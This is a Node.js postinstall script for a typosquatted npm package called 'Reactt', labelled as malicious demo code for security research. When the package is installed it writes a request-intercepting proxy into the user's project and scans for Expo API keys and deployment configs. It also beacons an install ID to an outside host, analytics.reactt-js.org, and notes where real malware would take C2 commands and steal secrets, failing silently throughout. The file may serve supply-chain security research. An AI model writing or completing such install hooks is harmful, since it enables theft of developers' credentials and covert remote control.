#!/usr/bin/env node

/**
 * Reactt Post-Installation Setup
 * WARNING: This is malicious demo code for security research
 */

const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

console.log('Finalizing Reactt installation...');

// Create malicious React development server proxy
function createDevServerProxy() {
  try {
    const proxyScript = `
// Reactt Development Proxy (MALICIOUS DEMO)
const http = require('http');
const httpProxy = require('http-proxy-middleware');

const proxy = httpProxy({
  target: 'http://localhost:3000',
  changeOrigin: true,
  onProxyReq: function(proxyReq, req, res) {
    // Intercept all API requests during development
    if (req.url && req.url.includes('/api/')) {
      console.log('[DEMO] Intercepted API request:', req.method, req.url);
      
      // In real attack, would log sensitive API data
      if (req.body) {
        console.log('[DEMO] Request body intercepted');
      }
    }
  },
  onProxyRes: function(proxyRes, req, res) {
    // Intercept API responses
    if (req.url && req.url.includes('/api/')) {
      console.log('[DEMO] Intercepted API response:', proxyRes.statusCode);
    }
  }
});

module.exports = proxy;
`;

    const proxyPath = path.join(process.cwd(), 'reactt-proxy.js');
    fs.writeFileSync(proxyPath, proxyScript);
    console.log('[DEMO] Development proxy created');
    
  } catch (error) {
    // Silently fail
  }
}

// Check for React Native projects (mobile app development)
function checkReactNative() {
  try {
    const rnFiles = [
      'android/',
      'ios/',
      'metro.config.js',
      'react-native.config.js',
      'app.json'
    ];
    
    const isReactNative = rnFiles.some(file => fs.existsSync(file));
    
    if (isReactNative) {
      console.log('[DEMO] React Native project detected');
      
      // Look for mobile app secrets
      const appJson = fs.existsSync('app.json') ? 
        JSON.parse(fs.readFileSync('app.json', 'utf8')) : {};
      
      if (appJson.expo) {
        console.log('[DEMO] Expo project detected');
        
        // Check for API keys in Expo config
        const expoKeys = ['apiKey', 'appId', 'projectId', 'extra'];
        const foundKeys = expoKeys.filter(key => appJson.expo[key]);
        
        if (foundKeys.length > 0) {
          console.log('[DEMO] Found Expo configuration keys:', foundKeys);
        }
      }
    }
    
    return isReactNative;
  } catch (error) {
    return false;
  }
}

// Network connectivity test to malicious server
function testConnectivity() {
  try {
    const options = {
      hostname: 'analytics.reactt-js.org',
      port: 443,
      path: '/ping',
      method: 'GET',
      timeout: 5000,
      headers: {
        'User-Agent': 'Reactt/18.2.1 Setup',
        'X-Install-ID': Math.random().toString(36).substr(2, 9)
      }
    };
    
    const req = https.request(options, (res) => {
      console.log('[DEMO] Connected to Reactt analytics server');
      res.on('data', (chunk) => {
        // In real malware, would receive commands from C2
      });
    });
    
    req.on('error', (error) => {
      // Silently fail - server doesn't exist anyway
    });
    
    req.on('timeout', () => {
      req.destroy();
    });
    
    req.end();
    
  } catch (error) {
    // Ignore connection errors
  }
}

// Check for deployment configurations
function scanDeploymentConfig() {
  try {
    const deploymentFiles = [
      'vercel.json',
      'netlify.toml',
      '.github/workflows',
      'Dockerfile',
      'docker-compose.yml',
      'heroku.yml'
    ];
    
    const deploymentInfo = {};
    
    deploymentFiles.forEach(file => {
      if (fs.existsSync(file)) {
        deploymentInfo[file] = true;
        console.log('[DEMO] Deployment config found:', file);
        
        // In real attack, would extract deployment secrets
      }
    });
    
    // Check for Vercel environment variables
    if (fs.existsSync('.vercel')) {
      console.log('[DEMO] Vercel project detected');
    }
    
    return deploymentInfo;
  } catch (error) {
    return {};
  }
}

// Execute post-installation tasks
setTimeout(() => {
  createDevServerProxy();
  checkReactNative();
  testConnectivity();
  scanDeploymentConfig();
  console.log('âœ“ Reactt enhancement complete');
}, 2000);
